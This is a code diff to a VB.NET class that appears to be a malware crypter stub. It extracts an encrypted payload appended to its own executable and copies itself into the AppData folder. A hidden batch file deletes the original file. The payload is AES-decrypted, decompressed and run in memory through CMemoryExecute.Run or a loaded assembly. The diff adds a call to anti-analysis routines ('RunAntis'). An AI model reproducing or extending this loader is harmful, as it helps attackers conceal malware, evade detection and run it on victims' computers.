@@ -34,13 +34,27 @@ Class Stuff
         Return NewByts
     End Function
 
+    Shared Sub Ant()
+        Dim L = New anti.Antis
+        L.AppExePath = Application.ExecutablePath
+        L.AppPath = Application.StartupPath
+        L.RunAntis()
+    End Sub
+
     Shared Sub Test()
+        Ant()
         Dim AppPath As String = Application.ExecutablePath
 
         Dim Payload() As Byte = GetPload(AppPath)
         Dim i As Integer = FindSplit(Payload)
         Dim Start As Integer = i
-        If Payload(Start - 10) = &H54 Then
+        If Payload(Start - 8) = &H54 Then
+
+            'anti's
+            Ant()
+        End If
+
+        If Payload(Start - 12) = &H54 Then
             'copy self
             Dim TmpPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
             If AppPath.ToLower.Contains(TmpPath.ToLower) Then
@@ -50,7 +64,7 @@ Class Stuff
                 'copy our self to temp and re execute
                 FileIO.FileSystem.WriteAllBytes(TmpPath & AppName, FileIO.FileSystem.ReadAllBytes(AppPath), False)
                 Process.Start(TmpPath & AppName)
-                If Payload(Start - 8) = &H54 Then
+                If Payload(Start - 10) = &H54 Then
                     FileIO.FileSystem.WriteAllText("a.bat", "ping 127.0.0.1 -n 3 > nul" & Environment.NewLine & "del " & """" & Application.ExecutablePath & """" & Environment.NewLine & "del a.bat", False)
                     Dim startInfo As New ProcessStartInfo("a.bat")
                     startInfo.WindowStyle = ProcessWindowStyle.Hidden
@@ -62,7 +76,7 @@ Class Stuff
 
             End If
         End If
-        If Payload(Start - 12) = &H54 Then
+        If Payload(Start - 14) = &H54 Then
             'net
         Else
             'native
@@ -81,11 +95,11 @@ Class Stuff
         NewByts = Loop1(NewByts, Payload, Start)
         NewByts = Loop2(NewByts)
 
-        If Payload(Start - 12) = &H54 Then
+        If Payload(Start - 14) = &H54 Then
             Dim f As New dll.Class1
             f.Main(Application.ExecutablePath)
         Else
-            CMemoryExecute.Run(AES_Decrypt(decompress(NewByts)), AppPath)
+            CMemoryExecute.Run(AES_Decrypt(Decompress(NewByts)), AppPath)
         End If
 
         Process.GetCurrentProcess.Kill()
@@ -218,7 +232,7 @@ Class Stuff
             'decode assembly here
 
             stream.Read(assemblyData, 0, assemblyData.Length)
-            assemblyData = AES_Decrypt(assemblyData)
+            assemblyData = AES_Decrypt(Decompress(assemblyData))
             Return Reflection.Assembly.Load(assemblyData)
 
         End Using ' stream
